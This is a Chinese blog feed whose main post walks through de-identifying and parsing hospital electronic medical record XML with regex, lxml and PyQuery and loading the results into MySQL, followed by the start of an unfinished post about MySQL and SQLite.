<p>先脱敏，大概的姓名身份证号住址啥的都挑出来抹掉，一般拿正则表达式替换一下就行了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

p1 <span class="token operator">=</span> <span class="token string">r'&lt;姓名.*?>.*?&lt;/姓名>'</span>
p2 <span class="token operator">=</span> <span class="token string">r'&lt;姓名>小明&lt;/姓名>'</span>
newtext <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="提出内层html">提出内层html</h3>
<p>xml里面嵌套了一层html（还是html4.0），html里面又嵌套了几段xml</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/
XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResponse</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://tempuri.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>
            HEAD<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span>Demo For Lord<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META http-equiv=Content-Type 
            content="text/html; charset=unicode"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META content="MSHTML 6.00.2900.6182"

            中间太长略去

            多重耐药菌防控措施处置表 (42)出科病历评分表 (43)病历排序<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/FONT<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>nbsp;<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/BODY<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>errorMsg</span><span class="token punctuation">></span></span>string<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>errorMsg</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResponse</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>除了最外层的xml，其他的标签都被转码了。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token entity named-entity" title="&amp;">&amp;amp;</span>lt;/FONT<span class="token entity named-entity" title="&amp;">&amp;amp;</span>gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>先把<code>&amp;amp;</code>转码回<code>&amp;</code>，再把<code>&amp;lt;</code>转为<code>&lt;</code>，<code>&amp;gt;</code>转回<code>&gt;</code></p>
<p>转完之后会变成熟悉的标签</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后删掉空格之类的<code>&amp;nbsp;</code>以及<code>&amp;amp;nbsp;</code></p>
<p>规整的数据，比如一些用标签区分出来的数据，解析一下XML或者用直接用正则表达式提出来</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">chief_compliant <span class="token operator">=</span> <span class="token string">r'(?&lt;=&lt;STRONG>主诉:&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="病案号等xml中的内容">病案号等xml中的内容</h3>
<p>病案号之类的可以用正则直接抽</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">medical_record_number <span class="token operator">=</span> <span class="token string">r'&lt;病案号.*?>.*?&lt;/病案号>'</span>
medical_record_number_temp <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>medical_record_number<span class="token punctuation">,</span> htmlhandle<span class="token punctuation">)</span>
<span class="token keyword">if</span> medical_record_number_temp<span class="token punctuation">:</span>
    modified_number <span class="token operator">=</span> <span class="token string">r'\d&#123;6&#125;(?=&lt;/病案号>)'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>modified_number<span class="token punctuation">,</span> medical_record_number_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> <span class="token string">"Null"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="html部分">html部分</h3>
<p>要完整的把html中所有的字段都分析一下然后重新存到数据库里面，正则表达式就麻烦起来了，还是直接用xml库解析一下xml比较好，比如Xpath和Beautifulsoup之类的（这里建议数据量大、操作多的直接上lxml和regex、re2之类的，不用Beautifulsoup和re这两个库）</p>
<p>先用utf-8编码读取</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xmlread<span class="token punctuation">:</span>
    xmltext <span class="token operator">=</span> xmlread<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用lxml直接解析的时候会出报错，因为lxml不认unicode之类的，我们给他转成byte</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">ValueError: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>加一句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml_b <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>xmltext<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后用lxml解析就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>myxml_b<span class="token punctuation">)</span>
result <span class="token operator">=</span> etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>myxml<span class="token punctuation">,</span>pretty_print <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要提取的主要信息都在html部分里面，外层的xml里面没啥东西，我们直接把外层的xml扔了，解析里面的html</p>
<p>另存为html就可以在浏览器里看到了，使用F12调试工具可以直接抓取html里面元素的xpath</p>
<figure>
<img src="/81d4/image-20200426094024186.png" alt="病历" /><figcaption aria-hidden="true">病历</figcaption>
</figure>
<p>但是仔细一看发现这个病历的html标签每份不太一样，比如有的第10对p标签里面是主诉的东西，但是另一份病历第10对p标签里面是住院病人离院责任书。没有固定的标志位，不太好提，不如直接上正则。</p>
<p>多看了几份病历发现小问题很多，格式一点也规整，比如主诉，不同病历有下面这几种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>反复咳嗽、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#4682b4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>心累、气紧6年，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>双下肢水肿4年，加重12天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span>
<span class="token attr-name">&lt;P</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>steelblue</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>:发现血压升高30+年，反复头晕4+月，加重1天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>P</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>有的连冒号都被颜色标签截断了，最后索性用正则直接拉取含有主诉的p标签内的整段</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 主诉（re方法）</span>
<span class="token comment"># chief_compliant = r'(?&lt;=&lt;STRONG>主诉.*?&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
chief_compliant <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?主诉.*?&lt;/P>'</span>
chief <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>chief_compliant<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/81d4/image-20200426220846518.png" alt="image-20200426220846518" /><figcaption aria-hidden="true">image-20200426220846518</figcaption>
</figure>
<p>输出的结果再把标签、主诉二字和冒号等删去</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
chief_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>chief<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># clean the chief compliant text</span>
    p1 <span class="token operator">=</span> <span class="token string">r'主诉|\n|:|：'</span>
    chief_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chief_clean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>差不多能看了</p>
<figure>
<img src="/81d4/image-20200426220726567.png" alt="image-20200426220726567" /><figcaption aria-hidden="true">image-20200426220726567</figcaption>
</figure>
<p>再用同样的方法提现病史的时候遇到了问题，发现正则会把之前主诉的内容也匹配上，这是python正则的懒惰匹配只能向后没有向前。一个办法是抽出来然后删掉主诉</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 现病史（re方法）</span>
phpi <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?现病史.*?&lt;/P>'</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>phpi<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    <span class="token comment"># remove_tag = r'&lt;[^>]+>'</span>
    <span class="token comment"># hpi_no_tag = regex.sub(remove_tag,'', hpi[0])</span>
    <span class="token comment"># if hpi_no_tag:</span>
    <span class="token comment">#     hpi_no_title_tag = regex.sub(r'主诉','',hpi_no_tag[0])</span>
    <span class="token comment">#     if hpi_no_title_tag:</span>
    <span class="token comment">#         text.append(hpi_no_title_tag[0])</span>
    <span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
    hpi_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># clean the hpi compliant text</span>
        p1 <span class="token operator">=</span> <span class="token string">r'\n|:|：'</span>
        hpi_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        hpi_cut <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'.*?(?=现病史)'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_clean<span class="token punctuation">)</span>
        hpi_end <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'现病史'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_cut<span class="token punctuation">)</span>
        text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi_end<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后面5个病史都这样正则匹配很浪费时间，索性把这一大段全抽出来，直接全部去格式变为纯文本</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">主诉颈部不适伴头痛、头晕2周，加重1周。现病史2周前患者因长期伏案工作后出现颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，疼痛与天气变化无关，遂至“都江堰医院”就诊，检查头颅MRI未提示异常。近1周来，患者头晕、头痛加重，为求进一步系统治疗，遂入我科，门诊以“颈椎病”收入住院。入院症见步入病房，神清，精神可，颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，纳眠可，二便调。既往史否认“糖尿病”、“高血压病”、“冠心病”等慢性病病史，否认“乙肝”、“结核”等传染病病史，否认重大手术史及外伤史。否认药物过敏史及食物过敏史，预防接种史不详。个人史生于四川阿坝长期居住于当地，否认疫区居住史，否认冶游史，否认吸烟、嗜酒等不良嗜好。月经及婚育史，患者自诉近期月经周期紊乱及月经量减少；适龄婚育，育有1女，家人均体健。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后根据主诉、现病史、既往史拆分每一部分</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 拉取现病史</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=现病史).*?(?=既往史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span>
<span class="token comment"># 拉取既往史</span>
item <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=既往史).*?(?=个人史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> item<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="批量读写文件">批量读写文件</h3>
<p>差不多能读了就把所有的病历批处理一下，这里用os.walk遍历所有xml文件（文件名是HIS标识+xml，不连续，就直接批量拉取了）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dir = "./Data1"</span>
<span class="token comment">#使用listdir循环遍历</span>
<span class="token keyword">def</span> <span class="token function">getxml</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> os
    path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token builtin">dir</span>
    dirlist <span class="token operator">=</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> dirlist<span class="token punctuation">:</span>
        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".xml"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./XMLfilename.txt"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> path<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="写入数据库">写入数据库</h2>
<p>最后是入库操作，这里为了省事直接用PyMySQL了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql
connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span>workstation_host<span class="token punctuation">,</span>
                             port<span class="token operator">=</span>workstation_port<span class="token punctuation">,</span>
                             user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>
                             password<span class="token operator">=</span>workstation_passwd<span class="token punctuation">,</span>
                             db<span class="token operator">=</span><span class="token string">'EMR'</span><span class="token punctuation">,</span>
                             charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
cursor <span class="token operator">=</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO `medical_EHR` (`HIS`,`Chief_complaint`) VALUES (%s, %s)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="其他">其他</h2>
<p>一些大段的文本，比如主诉、病史之类的后期结构化用LSTM或者Bert跑一下，这个以后再讲。</p>
<p>现在这个电子病历吧，感觉跟纸币支付宝化一样，疯狂泄露隐私等问题根本没人管，指不定哪天你个人信息全给你卖了。 以后你们到医院还是能要纸质凭据就要纸质的，回头出了什么事找医院撕逼比较好办。另，现在医保吃紧，交了很多年医保到了用的时候大概率被赖账，别被坑了找医院讨说法还被打成医闹反动分子；什么？医生不都是弱势群体白衣天使咩？啊这，你说是那就是。</p>
<blockquote>
<p>三个劫道的不如一个卖药的,三个卖药的不如一个开学校的</p>
</blockquote>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>xml</tag>
        <tag>电子病历</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL从入门到跑路</title>
    <url>/45b9/</url>
    <content><![CDATA[<p>用了这么久数据库，现在还只会增删查改，开个坑学学优化。 <a id="more"></a> 等待填坑</p>
<p>这个图比较清晰</p>
<p><img src="/45b9/db.webp" /></p>
<p>看到clickhouse的速度很快，有空看一下</p>
<h2 id="轻如鸿毛的sqlite">轻如鸿毛的SQLite</h2>
<p>好东西，在性能严重受限的开发板上跑着非常舒服，反正以前我试着感觉比另一个嵌入式数据库BerkeleyDB感觉好用多了。</p>
<p>其实我感觉很多小网站什么的，根本没必要上MySQL之类的东西，SQLite完全够了。什么存储过程啊，什么访问控制用户权限管理啊，基本上不怎么能用得到。数据量也小，那就索性连索引都不要了。 没有那一堆臃肿的东西，也没有那一堆乱七八糟的依赖。</p>
<p>而且这个东西快啊，数据量不怎么大的情况下比MySQL快，配置也简单</p>
<h2 id="你们这个是什么教材啊你们真的是害人不浅啊你们这个教材">你们这个是什么教材啊，你们真的是害人不浅啊你们这个教材</h2>
<h3 id="一张大表不好吗">一张大表不好吗</h3>
<blockquote>
<p>范式，什么范式？</p>
</blockquote>
<p>课本上这个要新建一张表，那一张表，好多个表</p>
<h3 id="隔离性">隔离性</h3>
<p>clickhouse那么快的原因就是一定程度上破坏了隔离性</p>
<h3 id="原子性">原子性</h3>
<p>MySQL在5.7以后支持了json，或许是感受到了Postgres的压力。</p>
<h2 id="好用的干活工具">好用的干活工具</h2>
